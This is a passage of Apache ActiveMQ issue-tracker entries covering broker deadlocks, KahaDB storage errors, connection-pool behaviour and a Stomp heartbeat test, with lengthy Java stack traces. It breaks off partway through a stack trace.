I am testing ActiveMQ 5.5 with my own stress test. I tried to implement a stress test that use jms ressource in the same fashion that my application would do. For that, I used jms template (from Spring) and  a pooled connection factory (as recommended). I run a fixed number of thread that plublish on fixed number of topics. Each thread pick up a topic and enter a loop that will send a message on the choosen topic.The issue is reproductible with SimpleAuthenticationPlugin active.  Configuration of the test :  100 topics more than one thread per topic (actually 1500 producer threads)Common connection properties : alwaysSessionAsync=false dispatchAsync=false optimizeAcknowledge=true socketBufferSize=131072&trace=true&wireFormat.cacheSize=2048&wireFormat.tcpNoDelayEnabled=true&wireFormat.tightEncodingEnabled=true&keepAlive=true&soTimeout=10000&connectionTimeout=10000Producers :  Message are not persistent There is no transaction Message expiration time is 30s Unsing JMS template singleton with a PooledConnectionFactory 3 JVM running connection options alwaysSyncSend=true,copyMessageOnSend=falseConsumers : just listening to each topic with a SimpleMessageListenerContainer and count messages received 3 JVM runningIn attachment, you will find activemq config file and thread dumps. I can attach the producer/consumers code if you need it but I think you have your own tests.This Jira is critical for me because security is mandatory for our use.If you need more information, please ask.
issueID:AMQ-3455
type:Bug
changed files:
texts:Broker may deadlock when creating queues under load with wildcard consumers
Found one Java-level deadlock:============================="ActiveMQ NIO Worker":  waiting to lock monitor 108de7878 (object 7f4ca0520, a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor),  which is held by "ActiveMQ NIO Worker""ActiveMQ NIO Worker":  waiting to lock monitor 108de64c8 (object 7f4ca1468, a java.lang.Object),  which is held by "ActiveMQ NIO Worker""ActiveMQ NIO Worker":  waiting to lock monitor 108de7878 (object 7f4ca0520, a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor),  which is held by "ActiveMQ NIO Worker"Java stack information for the threads listed above:==================================================="ActiveMQ NIO Worker": at org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.create(VirtualDestinationInterceptor.java:67) - waiting to lock <7f4ca0520> (a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor) at org.apache.activemq.broker.region.CompositeDestinationInterceptor.create(CompositeDestinationInterceptor.java:52) at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:450) at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:247) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89) at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:80) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:556) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227) - locked <7f5c933e8> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138) at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)"ActiveMQ NIO Worker": at org.apache.activemq.broker.region.AbstractRegion.getDestinations(AbstractRegion.java:231) - waiting to lock <7f4ca1468> (a java.lang.Object) at org.apache.activemq.broker.region.RegionBroker.getDestinations(RegionBroker.java:145) at org.apache.activemq.broker.region.virtual.VirtualTopic.create(VirtualTopic.java:56) at org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.create(VirtualDestinationInterceptor.java:68) - locked <7f4ca0520> (a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor) at org.apache.activemq.broker.region.CompositeDestinationInterceptor.create(CompositeDestinationInterceptor.java:52) at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:450) at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:247) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89) at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:80) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:556) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227) - locked <7f564acc8> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138) at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)"ActiveMQ NIO Worker": at org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.intercept(VirtualDestinationInterceptor.java:47) - waiting to lock <7f4ca0520> (a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor) at org.apache.activemq.broker.region.CompositeDestinationInterceptor.intercept(CompositeDestinationInterceptor.java:38) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:129) - locked <7f4ca1468> (a java.lang.Object) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:301) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:155) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:520) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:300) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227) - locked <7f52f5a90> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138) at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)Found 1 deadlock.
issueID:AMQ-3456
type:Improvement
changed files:activemq-admin
ShellCommand.java
texts:Update activemq-admin usage to include info on how to change JMX access
By default, the bin/activemq-admin script connects to the standard JMX URL without authentication. Please update the "Usage:" output to show users how to change the JMX URL and set username and passwordFor example:./activemq-admin -Dactivemq.jmx.url=service:jmx:rmi:///jndi/rmi://127.0.0.1:58404/jmxrmi -Dactivemq.jmx.user=admin -Dactivemq.jmx.password=activemq stop
issueID:AMQ-3457
type:Bug
changed files:
texts:temp destinations should only be deleted once all users of a pooled connection call close
AMQ-2349 added some code to clean up temp destinations once close() is called on a pooled connection. This caused pretty much all the JMS request-reply tests to fail in Camel with "javax.jms.InvalidDestinationException: Cannot publish to a deleted Destination"  The problem is that with a pooled connection, multiple users can be using a Connection at the same time (a reference count is kept of how many there are) so if once calls close() the temp destinations of several others could be deleted while they are still using them. I think the correct behavior would be to only delete the temp destinations when all connection users call close() (i.e. when the reference count becomes zero).Attaching a proposed fix for this shortly for review.
issueID:AMQ-3459
type:Bug
changed files:InactiveDurableSubscriptionView.java
ManagedRegionBroker.java
texts:Inactive durable subscribers view doesn&#39;t show selector
It"s also not shown in web console for the same reason and looks like subscriber is created without selector.
issueID:AMQ-3463
type:Bug
changed files:
texts:Sync pom and osgi metadata
For some packages "optional" is different in maven and osgi metadata
issueID:AMQ-3464
type:Improvement
changed files:
texts:xml view for subscribers in admin console
as discussed on the mailing list here is a patch against 5.5.0-fuse-00-43 to provide an XML view to durable topic subscribers in the admin interface
issueID:AMQ-3465
type:Bug
changed files:TransactionContext.java
texts:TransactionContext produces errors in concurrent environment
Method "isInXATransaction" of class org.apache.activemq.TransactionContext seems to be implemeted incorrectly. Here is the code:public boolean isInXATransaction() {    return (transactionId != null && transactionId.isXATransaction()) || !ENDED_XA_TRANSACTION_CONTEXTS.isEmpty();}Map "ENDED_XA_TRANSACTION_CONTEXTS" is a static field. TransactionContext instances are used for both outbound and inbound communications. Suppose a thread creating a new non-transactional session. It calls isInXATransaction and gets true, just because another thread is completing transactional message delivery at the same time. After XAResource.end() call but before XAResource.commit() call the map is not empty and it results in a JMSException in the first thread (see org.apache.activemq.ra.ManagedTransactionContext.setUseSharedTxContext(boolean)").
issueID:AMQ-3466
type:Bug
changed files:
texts:IndexOutOfBounds in kahadb with large number of subscriptions and pending messages
When there are several durable subscribers each with a large number of pending messages to be acked the an error occurs, as well as some others involving ArrayIndexOutOfBoundsExceptions and NullPointerExceptions while reading or writing the chunk stream.javax.jms.JMSException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1287) at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:704) at org.apache.activemq.TransactionContext.commit(TransactionContext.java:299) at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:560) at org.apache.activemq.process.TopicWithManySelectorsTest.sendNotification(TopicWithManySelectorsTest.java:126) at org.apache.activemq.process.TopicWithManySelectorsTest.test(TopicWithManySelectorsTest.java:85) at org.apache.activemq.process.TopicWithManySelectorsTest.testMass(TopicWithManySelectorsTest.java:42) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at junit.framework.TestCase.runTest(TestCase.java:168) at junit.framework.TestCase.runBare(TestCase.java:134) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:96) at junit.framework.TestResult$1.protect(TestResult.java:110) at junit.framework.TestResult.runProtected(TestResult.java:128) at junit.framework.TestResult.run(TestResult.java:113) at junit.framework.TestCase.run(TestCase.java:124) at junit.framework.TestSuite.runTest(TestSuite.java:232) at junit.framework.TestSuite.run(TestSuite.java:227) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:79) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:94) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:196) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:65)Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:424) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:219) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)Caused by: javax.transaction.xa.XAException: POST COMMIT FAILED at org.apache.activemq.transaction.Transaction.doPostCommit(Transaction.java:182) at org.apache.activemq.transaction.Transaction$2.call(Transaction.java:54) at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303) at java.util.concurrent.FutureTask.run(FutureTask.java:138) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:768) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:264) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) ... 14 moreCaused by: java.lang.ArrayIndexOutOfBoundsException at java.lang.System.arraycopy(Native Method) at org.apache.kahadb.page.Transaction$2.read(Transaction.java:494) at java.io.DataInputStream.readFully(DataInputStream.java:178) at java.io.DataInputStream.readFully(DataInputStream.java:152) at org.apache.activemq.store.kahadb.MessageDatabase$HashSetStringMarshaller.readPayload(MessageDatabase.java:2352) at org.apache.activemq.store.kahadb.MessageDatabase$HashSetStringMarshaller.readPayload(MessageDatabase.java:2335) at org.apache.kahadb.index.BTreeNode$Marshaller.readPayload(BTreeNode.java:201) at org.apache.kahadb.index.BTreeNode$Marshaller.readPayload(BTreeNode.java:147) at org.apache.kahadb.page.Transaction.load(Transaction.java:406) at org.apache.kahadb.page.Transaction.load(Transaction.java:361) at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262) at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225) at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:672) at org.apache.kahadb.index.BTreeNode.get(BTreeNode.java:558) at org.apache.kahadb.index.BTreeIndex.get(BTreeIndex.java:184) at org.apache.activemq.store.kahadb.MessageDatabase.removeAckLocation(MessageDatabase.java:1642) at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1051) at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:890) at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:888) at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:833) at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:825) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:751) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.doAcknowledge(KahaDBStore.java:650) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:637) at org.apache.activemq.store.ProxyTopicMessageStore.acknowledge(ProxyTopicMessageStore.java:78) at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:505) at org.apache.activemq.broker.region.DurableTopicSubscription.unmatched(DurableTopicSubscription.java:85) at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:44) at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:628) at org.apache.activemq.broker.region.Topic$4.afterCommit(Topic.java:466) at org.apache.activemq.transaction.Transaction.fireAfterCommit(Transaction.java:109) at org.apache.activemq.transaction.Transaction.doPostCommit(Transaction.java:177) ... 20 more
issueID:AMQ-3467
type:Improvement
changed files:
texts:Replace ack locations btree with per subscriber message id range on a paged list
The current storage of ack locations for durable subs in kahadb uses too much memory and index space. This is a place holder to revisit that. A range per durable sub in a paged list may be the simplest alternative as that will allow per page updates.
issueID:AMQ-3468
type:Improvement
changed files:pom.xml
JmsFrameTranslator.java
JettisonMappedXmlDriver.java
texts:Update xstream to latest release v1.4.1
XStream has released version 1.4.1 which includes the fixes that were worked around in AMQ-2825.  This means we can remove our local version of JettisonMappedXmlDriver.java and use the one in the XStream API once more.
issueID:AMQ-3473
type:Bug
changed files:KahaDBStore.java
texts:Messages (possibly) stuck and pending messages count showing high number of pending message which do not get sent to a consumer.
Two brokers, each with a network connection to the other. We have two producers producing persistent messages to a single queue at a rate of 20-50/second. There is a single consumer. All clients prefer the primary broker.The consumer is "bursty" - i.e. it grabs 5000 messages and then processes them. During processing, new messages build up on the broker.If the primary broker is restarted we will see it come back with, as you would expect, with a number of pending messages. This message count never fully returns to 0 even if the producers are stopped and browsing the queue through the GUI shows either no messages or only messages that were produced since the restart.I have turned on Kaha debugging and, after the initial restart, we see the following during every checkpoint: &#91;eckpoint Worker&#93; TRACE MessageDatabase                - Last update: 3974:2450180, full gc candidates set: &#91;3950, 3951, 3973, 3974&#93;... &#91;eckpoint Worker&#93; TRACE MessageDatabase                - gc candidates after dest:1:MyQueue, &#91;3951, 3973&#93;... &#91;eckpoint Worker&#93; TRACE MessageDatabase                - gc candidates: &#91;3951, 3973&#93; &#91;eckpoint Worker&#93; TRACE MessageDatabase                - not removing data file: 3951 as contained ack(s) refer to referenced file: &#91;3950, 3951&#93; &#91;eckpoint Worker&#93; DEBUG MessageDatabase                - Cleanup removing the data files: &#91;3973&#93;(I assume that is supposed to say "&#91;Checkpoint Worker&#93;", incidentally)After the second restart we will see many: &#91;0.8.0.200:47300&#93; WARN  MessageDatabase                - Duplicate message add attempt rejected. Destination: MyQueue, Message id: ID:node001-58675-1314038640553-0:17:1:1:470776Followed by: &#91;eckpoint Worker&#93; TRACE MessageDatabase                - Last update: 3974:13515407, full gc candidates set: &#91;3950, 3951, 3974&#93;... &#91;eckpoint Worker&#93; TRACE MessageDatabase                - gc candidates after dest:1:MyQueue, &#91;3951&#93;... &#91;eckpoint Worker&#93; TRACE MessageDatabase                - gc candidates: &#91;3951&#93; &#91;eckpoint Worker&#93; DEBUG MessageDatabase                - Cleanup removing the data files: &#91;3951&#93;This is very similar, if not the same, to AMQ-2955. I have tried setting "useCache=false" but this does not rectify the issue. This could also be a similar issue to AMQ-3281.I will attach a config. Please advise if you would like me to enable further debugging.I don"t currently have a test harness that replicates this issue and due to the fact this is only happening in our production environment, I"m unable to verify reliably whether messages are being lost, delayed or if this is purely a stats issue.
issueID:AMQ-3474
type:Improvement
changed files:FilePendingMessageCursor.java
texts:Investigate further onUsageChange flushing for FilePendingMessageCursor
It seems there"s a room for improvement in this area as flushing should be executed only when needed and synced among different cursors.
issueID:AMQ-3475
type:Improvement
changed files:
texts:Stomp message frame should include a persistent header when the sent message delivery mode was persistent
Messages that are sent with the delivery mode set the persistent should result in a Stomp Message frame that include the persistent header and a value of true to allow for a better JMS mapping.
issueID:AMQ-348
type:Improvement
changed files:ActiveMQResourceAdapter.java
texts:Provide the ability for the RA to be given an existing ConnectionFactory
If the RA could be given an existing ConnectionFactory, the same connection factory could be reused for inbound and outbound messaging, without requiring two different factories to be created.
issueID:AMQ-3481
type:Bug
changed files:
texts:Possible Stomp deadlock
When subscribing with receipt to the queue that already contains the messages, we can end up dead locking sending ack back to the broker and response to the stomp client.
issueID:AMQ-3482
type:Improvement
changed files:
texts:Make PooledConnectionFactory&#39;s sessionPool non-blocking in case its full.
When using the PooledConnectionFactory it internally caches the JMS Sessions. This is done using a commons pool. The amount of sessions to be pooled is controlled by the maximumActive property of the PooledConnectionFactory. Right now, when the session pool is full, then any further call to Connection.getSession() will block until a session is available from the pool.Depending on whether a connection is returned to the pool, this call might potentially block forever.IMHO this is not the best default behavior. Less experienced users might believe the JMS client is hung or suffering a bug if it simply does not return. There is currently no warning logged that this call will block, so no indication of the full session pool is given. I propose to change this default behavior and raise a JMSException exception in case the session pool is full and no further Session can be created.The underlying commons-pool class org.apache.commons.pool.impl.GenericObjectPoolFactory can be configured easily to raise an ex rather than blocking. This will indicate JMS clients that the session pool is full and allows them to take appropriate actions (retry later, or propagate the error upwards).
issueID:AMQ-3483
type:Improvement
changed files:
texts:Cleanup TODOs "Auto-generated catch block" to improve the quality of Tag List Report
Fast cleanup of TODOs "Auto-generated catch block".
issueID:AMQ-3484
type:Improvement
changed files:
texts:Stomp 1.1 - add a testcase for sending messages after expired heartbeat
The testcase below waits for five seconds after connecting and then tries to write a SEND frame. The test fails if a frame can be sent to the broker after missing heartbeat signals. public void testSendAfterMissingHeartbeat() throws Exception {String connectFrame = "STOMP
" +"login: system
" +"passcode: manager
" +"accept-version:1.1
" +"heart-beat:1000,0
" +"host:localhost
" +"
" + Stomp.NULL;stompConnection.sendFrame(connectFrame);String f = stompConnection.receiveFrame();assertTrue(f.startsWith("CONNECTED"));assertTrue(f.indexOf("version:1.1") >= 0);assertTrue(f.indexOf("heart-beat:") >= 0);assertTrue(f.indexOf("session:") >= 0);LOG.debug("Broker sent: " + f);Thread.sleep(5000);try { String message = "SEND
" + "destination:/queue/" + getQueueName() + "

" + "Hello World" + Stomp.NULL; stompConnection.sendFrame(message); fail("SEND frame has been accepted after missing heart beat"); } catch (Exception ex) { System.out.println(ex.getMessage()); }}
issueID:AMQ-3485
type:Bug
changed files:
texts:Transacted Session returns invalid MessageConsumer after the first MessageConsumer for the same destiantion. Bug introduced in 5.5.0 - working ok in 4.1.2
When I have a transacted Session, as it is single threaded I can"t create two MessageConsumer to the same Destination. But if I create a MessageConsumer to a Destination and then I close it, then I should be able to create a new MessageConsumer to the same Destination. This is working fine in active mq 4.1.2 but it doesn"t work in 5.5.0. It allows to create a second MessageConsumer but that seconde MessageConsumer always returns null when the queue has messages.i.e:Session session = .... //transacted sessionDestination dest = .... MessageConsumer mc = session.createMessageConsumer(dest);Message message = mc.receive(); // message received okmc.close();mc = session.createMessageConsumer(dest);Message message = mc.receive(); // message is nullThanks, Pablo.
issueID:AMQ-3486
type:Improvement
changed files:
texts:Add check to prevent Durable Subscriptions on Session that are in Individual Ack mode.
Using a Durable subscription with a Session that is in Individual ack can lead to some issues since its not really supported in the store currently.  Should throw an exception is a durable sub is created in this case.
issueID:AMQ-3488
type:Bug
changed files:AdvisoryConsumer.java
texts:Temporary destinations&#39; DestinationInfo commands over VM transport prevent connection closure
ActiveMQTempDestinations hold onto the source connection that created them. When the source connection is closed, its temporary destinations are deleted. Unfortunately, DestinationInfo commands convey the destination object with its source connection to all other connections on the same VMTransportServer. Hence when these other connections are closed, they attempt to delete the source connection"s temporary destination.Note that enabling marshaling on the VM transport works around this bug because destination serialization and deserialization does not maintain the source connection reference.This bug was not present in 5.4.2.
issueID:AMQ-3490
type:Bug
changed files:
texts:NPEs during message processing, using FileCursor
In a scenario where a single-consumer queue for non-presistent messages uses a file cursor to manage a backlog, bursts of messages result in NPEs.Thread dumps for 3 different examples:2011-09-07 12:43:27,057 ERROR &#91;cursors.FilePendingMessageCursor&#93; [] : &#91;Usage Async Task&#93; Caught an IO Exception getting the DiskList7_PendingCursor:snTableQueue_CHFjava.lang.NullPointerExceptionnull    at java.io.Writer.write(Writer.java:140)null    at java.io.BufferedWriter.newLine(BufferedWriter.java:225)null    at java.util.Properties.writeComments(Properties.java:671)null    at java.util.Properties.store0(Properties.java:805)null    at java.util.Properties.store(Properties.java:796)null    at org.apache.kahadb.page.PageFile.storeMetaData(PageFile.java:570)null    at org.apache.kahadb.page.PageFile.load(PageFile.java:361)null    at org.apache.activemq.store.kahadb.plist.PListStore.intialize(PListStore.java:285)null    at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:218)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:435)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:388)null    at org.apache.activemq.usage.Usage$1.run(Usage.java:268)null    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)null    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)null    at java.lang.Thread.run(Thread.java: 619)nullException in thread "Usage Async Task" java.lang.RuntimeException: java.lang.NullPointerException    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:460)    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:435)    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:388)    at org.apache.activemq.usage.Usage$1.run(Usage.java:268)    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)    at java.lang.Thread.run(Thread.java:619)Caused by: java.lang.NullPointerException    at java.io.Writer.write(Writer.java:140)    at java.io.BufferedWriter.newLine(BufferedWriter.java:225)    at java.util.Properties.writeComments(Properties.java:671)================================================================2011-09-07 12:43:40,908 ERROR &#91;cursors.FilePendingMessageCursor&#93; &#91;1315421994681&#93; : &#91;ActiveMQ Transport: tcp:///134.242.171.26:35469&#93; Caught an IO Exception getting the DiskList 7_PendingCursor:snTableQueue_CHFjava.lang.NullPointerExceptionnull    at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:229)null    at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)null    at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:225)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:226)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:196)null    at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1603)null      at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:715)null    at org.apache.activemq.broker.region.Queue.send(Queue.java:647)null    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:409)null    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:543)null    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:301)null    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null    at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)null    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)null    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null      at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)null    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null      at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)null    at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)null    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)null    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)null    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)null    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)null    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)null    at 